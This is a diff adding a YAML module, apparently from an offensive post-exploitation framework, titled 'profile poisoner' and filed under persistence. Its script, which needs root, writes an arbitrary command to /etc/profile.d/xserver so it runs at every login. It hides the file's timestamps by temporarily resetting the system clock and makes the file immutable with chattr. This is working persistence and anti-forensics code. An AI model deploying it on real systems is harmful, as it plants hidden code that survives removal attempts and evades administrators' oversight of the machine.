@@ -1,0 +1,17 @@
+name: "profile poisoner"
+description: "Creates profile.d script"
+category: persistence
+need_root: true
+variables:
+  - name: cmd
+    description: "Command to execute"
+priority: 1000
+tip: "Profile is poisoned with command '{{cmd}}'"
+script: |
+  NOW=$(date +@%s)
+  date -s "$(stat -c '@%Z' /etc/hostname)"
+  echo '{{cmd}}' | sudo tee /etc/profile.d/xserver
+  touch /etc/profile.d/xserver
+  chattr +i /etc/profile.d/xserver
+  date -s "$NOW"
+  unset NOW
